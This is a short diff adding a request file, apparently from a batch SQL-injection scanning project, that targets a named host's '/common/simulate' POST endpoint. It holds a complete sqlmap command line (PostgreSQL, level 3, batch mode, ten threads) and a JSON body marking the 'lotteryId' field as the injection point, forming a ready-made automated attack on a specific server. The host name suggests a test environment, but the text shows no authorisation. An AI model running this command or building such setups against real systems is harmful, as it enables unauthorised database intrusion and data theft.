@@ -1,0 +1,3 @@
+http://uat2cpm102.bwt18.com:80/common/simulate (POST)  # c:/sqlmap/sqlmap.py -v 3 --dbms=postgresql --threads 10 --level=3 --timeout 10 -r D:\文档\PycharmProjects\BatchSqlmap\CP_Post_File\simulate --batch --output-dir ../PycharmProjects/BatchSqlmap/sqlmaplog
+
+{"lotteryId":"*"}
